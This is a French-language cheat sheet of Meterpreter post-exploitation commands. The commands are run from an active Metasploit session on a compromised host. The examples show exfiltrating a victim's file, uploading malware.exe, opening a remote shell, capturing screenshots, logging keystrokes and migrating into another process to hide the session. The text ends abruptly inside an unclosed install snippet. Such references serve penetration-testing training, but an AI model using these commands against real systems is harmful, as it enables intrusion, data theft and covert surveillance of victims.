# cheat sheet meterpreter

Une référence rapide pour les commandes courantes de **Meterpreter**, le payload interactif de Metasploit, avec fonctions, commandes et exemples. Suppose une session active.

---

## 1. Obtenir des informations système
**Fonction** : Afficher les détails du système cible.  
**Commande** : `sysinfo`  
**Exemple** : `sysinfo`  
- Affiche le nom de l’hôte, l’OS, l’architecture, etc. de la machine compromise.

---

## 2. Lister les processus
**Fonction** : Voir les processus en cours d’exécution.  
**Commande** : `ps`  
**Exemple** : `ps`  
- Liste les PID, noms et utilisateurs des processus sur la cible.

---

## 3. Télécharger un fichier
**Fonction** : Récupérer un fichier depuis la cible.  
**Commande** : `download <remote_path> <local_path>`  
**Exemple** : `download C:\Users\Victim\secret.txt /home/user/secret.txt`  
- Télécharge secret.txt de la cible vers l’attaquant.

---

## 4. Uploader un fichier
**Fonction** : Envoyer un fichier vers la cible.  
**Commande** : `upload <local_path> <remote_path>`  
**Exemple** : `upload /home/user/malware.exe C:\Temp\malware.exe`  
- Envoie malware.exe vers C:\Temp sur la cible.

---

## 5. Exécuter une commande shell
**Fonction** : Lancer une commande système sur la cible.  
**Commande** : `execute -f <command>`  
**Exemple** : `execute -f "dir"`  
- Exécute la commande "dir" sur une cible Windows.

---

## 6. Obtenir un shell interactif
**Fonction** : Accéder à un shell complet sur la cible.  
**Commande** : `shell`  
**Exemple** : `shell`  
- Ouvre un shell (cmd.exe sur Windows, /bin/sh sur Linux).

---

## 7. Prendre une capture d’écran
**Fonction** : Capturer l’écran de la cible.  
**Commande** : `screenshot`  
**Exemple** : `screenshot`  
- Sauvegarde une capture d’écran dans le répertoire de travail de Metasploit.

---

## 8. Enregistrer les frappes
**Fonction** : Capturer les saisies clavier de la cible.  
**Commande** : `keyscan_start`  
**Exemple** : `keyscan_start`  
- Démarre l’enregistrement des frappes (utiliser `keyscan_dump` pour voir les résultats).

---

## 9. Migrer vers un autre processus
**Fonction** : Transférer la session Meterpreter dans un autre processus.  
**Commande** : `migrate <PID>`  
**Exemple** : `migrate 1234`  
- Migre la session vers le processus avec le PID 1234.

---

## 10. Afficher les interfaces réseau
**Fonction** : Voir les configurations réseau de la cible.  
**Commande** : `ipconfig` (Windows) ou `ifconfig` (Linux)  
**Exemple** : `ipconfig`  
- Affiche les adresses IP et interfaces réseau de la cible.

---

## Notes importantes
- **Prérequis** : Une session Meterpreter active via Metasploit (ex. : après `exploit` et `sessions -i <id>`).
- **Installation** :  
  ```bash
  sudo apt update && sudo apt install -y metasploit-framework
  msfconsole
